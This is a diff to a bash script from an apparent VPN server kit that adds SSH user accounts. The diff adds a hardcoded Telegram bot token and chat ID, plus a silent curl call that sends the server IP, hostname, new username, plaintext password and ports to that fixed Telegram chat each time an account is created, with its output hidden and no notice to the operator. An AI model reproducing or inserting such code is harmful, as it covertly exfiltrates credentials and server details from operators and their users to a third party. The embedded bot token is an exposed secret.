@@ -58,6 +58,10 @@ export Server_Port="443"
 export Server_IP="underfined"
 export Script_Mode="Stable"
 export Auther=".geovpn"
+export CHATID="5491480146"
+export KEY="5893916269:AAFoRG0z9y0Rewi6K3bF6_momM9Wyom6BGE"
+export TIME="10"
+export URL="https://api.telegram.org/bot$KEY/sendMessage"
 
 # // Root Checking
 if [ "${EUID}" -ne 0 ]; then
@@ -128,9 +132,9 @@ fi
 portsshws=`cat /root/log-install.txt | grep -w "SSH Websocket" | cut -d: -f2 | awk '{print $1}'`
 wsssl=`cat /root/log-install.txt | grep -w "SSH SSL Websocket" | cut -d: -f2 | awk '{print $1}'`
 
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
-echo -e "\E[0;41;36m            SSH Account            \E[0m"
-echo -e "\033[0;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
+echo "-----------------------------------------";
+echo "---------=[ Add SSH Account ]=-----------";
+echo "-----------------------------------------";
 read -p "Username : " Login
 read -p "Password : " Pass
 read -p "Expired (hari): " masaaktif
@@ -188,11 +192,36 @@ echo -e "OpenSSH    : $opensh" | tee -a /etc/log-create-user.log
 echo -e "Dropbear   : $db" | tee -a /etc/log-create-user.log
 echo -e "SSH-WS     : $portsshws" | tee -a /etc/log-create-user.log
 echo -e "SSH-SSL-WS : $wsssl" | tee -a /etc/log-create-user.log
-echo -e "SSL/TLS    : $ssl" | tee -a /etc/log-create-user.log
+echo -e "SSL/TLS    :$ssl" | tee -a /etc/log-create-user.log
 echo -e "UDPGW      : 7100-7300" | tee -a /etc/log-create-user.log
 echo -e "----------------------------------" | tee -a /etc/log-create-user.log
 echo -e "----------------------------------" | tee -a /etc/log-create-user.log
 fi
+
+CHATID="$CHATID"
+KEY="$KEY"
+TIME="$TIME"
+URL="$URL"
+TEXT="<code>-----------------------</code>
+<code>Your Premium VPN Details</code>
+<code>-----------------------</code>
+<code>IP Address    =</code> <code>$IP</code>
+<code>Hostname      =</code> <code>$domen</code>
+<code>Username      =</code> <code>$Login</code>
+<code>Password      =</code> <code>$Pass</code>
+<code>-----------------------</code>
+<code>OpenSSH       = ${opensh}
+Dropbear      = ${db}
+Stunnel       =$ssl
+SSH WS TLS    = ${wsssl}
+SSH WS NTLS   = ${portsshws}
+BadVPN UDP    = 7100-7300</code>
+<code>-----------------------</code>
+<code>Expired = $exp</code>
+<code>-----------------------</code>
+"
+
+curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 echo "" | tee -a /etc/log-create-user.log
 read -n 1 -s -r -p "Press any key to back on menu"
 menu
